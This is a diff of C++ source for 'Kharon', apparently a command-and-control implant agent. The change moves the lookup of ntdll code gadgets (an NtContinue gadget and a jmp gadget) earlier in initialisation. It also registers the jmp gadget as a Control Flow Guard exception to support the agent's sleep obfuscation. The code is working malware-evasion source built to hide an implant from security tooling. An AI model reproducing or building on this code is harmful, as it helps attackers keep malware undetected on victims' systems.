@@ -168,8 +168,17 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
     KhDbgz( "Library iphlpapi.dll  Loaded at %p and Functions Resolveds", this->Iphlpapi.Handle  );
 
+    this->Config.Mask.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
+    this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
+
+    if ( ! this->Config.Mask.NtContinueGadget ) {
+        KhDbgz("dont was possible found the NtContinue gadget, using NtContinue address\n");
+        this->Config.Mask.NtContinueGadget = (UPTR)this->Ntdll.NtContinue;
+    }
+
     /* ========= [ cfg exceptions to sleep obf ] ========= */
     if ( this->Machine.CfgEnabled = this->Usf->CfgCheck() ) {
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Config.Mask.JmpGadget );
         this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtSetContextThread );
         this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtGetContextThread );
         this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtWaitForSingleObject );
@@ -351,14 +360,6 @@ auto DECLFN Kharon::Init(
 
     this->Machine.ProcessorName = (PCHAR)this->Hp->Alloc( ProcBufferSize );
     Mem::Copy( this->Machine.ProcessorName, cProcessorName, ProcBufferSize );
-    
-    this->Config.Mask.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
-    this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
-
-    if ( ! this->Config.Mask.NtContinueGadget ) {
-        KhDbgz("dont was possible found the NtContinue gadget, using NtContinue address\n");
-        this->Config.Mask.NtContinueGadget = (UPTR)this->Ntdll.NtContinue;
-    }
 
     KhDbgz( "======== Session Informations ========" );
     KhDbgz( "Agent UUID: %s", this->Session.AgentID );
